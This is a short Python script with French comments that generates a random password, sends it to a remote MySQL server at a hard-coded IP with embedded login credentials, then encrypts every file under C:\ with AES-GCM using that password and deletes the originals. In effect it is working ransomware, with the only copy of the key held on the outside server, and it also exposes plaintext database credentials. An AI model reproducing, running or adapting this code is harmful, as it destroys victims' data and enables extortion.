import os
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from art import *
import mysql.connector
import random

text=text2art("MOUTARDE")
print(text)
def generer_mot_aleatoire():
    lettres = string.ascii_lowercase  # toutes les lettres minuscules
    username = ''.join(random.choices(lettres, k=8))
    return username
def generer_mot_de_passe(longueur=12):
    caracteres = string.ascii_letters + string.digits
    mot_de_passe = ''.join(random.choices(caracteres, k=longueur))
    return mot_de_passe

def enregistrer_mot_de_passe(username, mot_de_passe):
    try:
        connexion = mysql.connector.connect(
            host="82.197.82.30",
            user="u189666068_helios",
            password="Emixamx321%",
            database="u189666068_passe"
        )

        curseur = connexion.cursor()
        requete = "INSERT INTO utilisateurs (username, mot_de_passe) VALUES (%s, %s)"
        valeurs = (username, mot_de_passe)
        curseur.execute(requete, valeurs)
        connexion.commit()

        print("Mot de passe sécurisé enregistré.")
        curseur.close()
        connexion.close()
    except mysql.connector.Error as err:
        print("Erreur MySQL:", err)

# Usage :

nom = generer_mot_aleatoire()
mdp = generer_mot_de_passe()
enregistrer_mot_de_passe(nom, mdp)
print(f"{mdp} est le mot de passe")

CHUNK_SIZE = 64 * 1024  # 64 Ko


def derive_key(password: bytes, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100_000,
        backend=default_backend()
    )
    return kdf.derive(password)


def encrypt_file(input_path, output_path, password):
    salt = os.urandom(16)
    nonce = os.urandom(12)
    key = derive_key(password.encode(), salt)
    encryptor = Cipher(
        algorithms.AES(key),
        modes.GCM(nonce),
        backend=default_backend()
    ).encryptor()

    with open(input_path, 'rb') as f_in, open(output_path, 'wb') as f_out:
        f_out.write(salt)
        f_out.write(nonce)
        while chunk := f_in.read(CHUNK_SIZE):
            f_out.write(encryptor.update(chunk))
        f_out.write(encryptor.finalize())
        f_out.write(encryptor.tag)

def encrypt_folder(folder_path, password, keep_original=False):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if file_path.endswith(".enc"):
                continue  # éviter de re-chiffrer
            encrypted_path = file_path + ".enc"
            print(f"Chiffrement de : {file_path}")
            encrypt_file(file_path, encrypted_path, password)
            if not keep_original:
                os.remove(file_path)

if __name__ == "__main__":
    dossier = "C:\\"  # <-- Remplace par ton dossier
    motdepasse = mdp  # <-- À personnaliser ou demander à l'utilisateur
    encrypt_folder(dossier, motdepasse)
    print("Chiffrement terminé.")
    input("")
